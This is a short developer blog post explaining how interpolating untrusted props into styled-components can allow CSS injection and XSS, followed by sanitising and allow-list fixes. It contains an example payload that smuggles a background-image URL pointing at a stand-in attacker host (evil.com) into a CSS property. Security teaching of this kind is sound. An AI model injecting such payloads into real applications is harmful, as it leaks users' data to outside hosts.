---
title: "The XSS dangers in interpolating styled-components"
description: "Learn about XSS vulnerabilities when interpolating styled-components in React"
publishDate: "2025-01-20"
tags: ["javascript", "react", "styled-components"]
---


## Avoiding XSS Vulnerabilities in [styled-components](https://styled-components.com/)

I recently learned at work with a coworker of how one can easily introduce XSS
vulnerabilities in a React application when using styled-components. This
article will explain how this can happen and how to avoid it.

### The Problem

Consider the following styled-components example:

```javascript
const Container = styled.div`
  position: ${(p) => (p.isFixed ? 'fixed' : 'relative')}; // this is safe
  top: ${(p) => p.offsetTop}px;
`;
```

At first glance, it seems harmless to pass `p.offsetTop` directly into the `top` property. However, this can lead to security risks if the value of `offsetTop` is not sanitized and an attacker is able to control its value. Here's why:

1. **CSS Injection**: If `offsetTop` contains malicious code, it could inject arbitrary CSS.
2. **JavaScript Execution**: When this style is server-side rendered (SSR), an attacker could execute JavaScript within the context of the user's session.
3. **External Requests**: Malicious CSS, such as a `background-image` property with a URL, can trigger requests to external services, leaking sensitive user data.

### Why This Happens

The root cause is the inability to safely escape CSS when injecting styles into `<style>` tags inside HTML. Unlike HTML attributes, which React can safely escape, CSS allows unsafe characters that could be exploited.

### Real-World Example

Imagine an attacker controlling `offsetTop` by injecting a payload:

```javascript
const maliciousPayload = `10px; background-image: url("http://evil.com/steal-data")`;

// Usage in a component
<Container offsetTop={maliciousPayload} />;
```

This would render the following unsafe CSS:

```css
.Container {
  position: relative;
  top: 10px; background-image: url("http://evil.com/steal-data");
}
```

When the browser processes this style, it could leak sensitive user data to the attacker's server.

### Safe Alternative

To prevent this kind of vulnerability:

1. **Sanitize Inputs**: If you must, always validate and sanitize user inputs before using them in styles.

   ```javascript
   const sanitizeValue = (value) => parseInt(value, 10) || 0;
   const safeOffsetTop = sanitizeValue(userInput);
   ```

2. **Avoid Direct CSS Injection**: Refrain from using variables directly in styled components if they come from untrusted sources.


3. **Limit Interpolations to Flags**: Only use interpolations for boolean flags or predefined values, not for arbitrary CSS properties.

```javascript
const predefinedAcceptedOffset = {
  0: 0,
  1: 10,
  2: 20,
};
const Container = styled.div`
  position: ${(p) => (p.isFixed ? 'fixed' : 'relative')}; // this is safe
  top: ${(p) => predefinedAcceptedOffset[p.offset]}px;
`;
```
